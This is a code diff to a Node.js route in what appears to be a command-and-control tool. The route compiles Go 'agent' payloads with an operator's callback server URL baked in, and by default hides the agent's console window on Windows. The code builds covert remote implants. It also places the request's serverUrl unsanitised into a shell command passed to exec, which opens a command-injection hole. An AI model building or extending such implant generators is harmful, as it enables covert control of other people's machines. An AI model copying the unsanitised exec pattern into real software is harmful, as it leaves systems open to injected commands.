@@ -17,7 +17,7 @@ if (!fs.existsSync(PAYLOAD_DIR)) {
  * Triggers a Go build for a new agent
  */
 router.post('/generate', verifyToken, async (req, res) => {
-  const { serverUrl } = req.body;
+  const { serverUrl, showGui } = req.body;
 
   if (!serverUrl) {
     return res.status(400).json({ error: 'Server URL is required' });
@@ -31,11 +31,19 @@ router.post('/generate', verifyToken, async (req, res) => {
   const agentSourceDir = path.join(__dirname, '../../../agent');
   
   // Construct the go build command
-  // We use ldflags to inject the serverUrl
-  const ldflags = `-X 'bytecode-agent/internal/config.DefaultServerURL=${serverUrl}' -H=windowsgui`;
+  // We use ldflags to inject the serverUrl and debug status
+  let ldflags = `-X 'bytecode-agent/internal/config.DefaultServerURL=${serverUrl}'`;
+  
+  if (showGui) {
+    ldflags += ` -X 'bytecode-agent/internal/config.DebugMode=true'`;
+  } else {
+    // -H=windowsgui hides the console window on Windows
+    ldflags += ` -H=windowsgui`;
+  }
+
   const command = `go build -ldflags="${ldflags}" -o "${outputPath}" cmd/agent/main.go`;
 
-  console.log(`[PAYLOAD] Generating: ${outputName} for ${serverUrl}`);
+  console.log(`[PAYLOAD] Generating: ${outputName} for ${serverUrl} (GUI: ${showGui})`);
 
   exec(command, { cwd: agentSourceDir }, (error, stdout, stderr) => {
     if (error) {
@@ -50,7 +58,8 @@ router.post('/generate', verifyToken, async (req, res) => {
     res.json({ 
       success: true, 
       downloadUrl: `/api/payloads/download/${outputName}`,
-      filename: outputName
+      filename: outputName,
+      showGui: showGui
     });
   });
 });
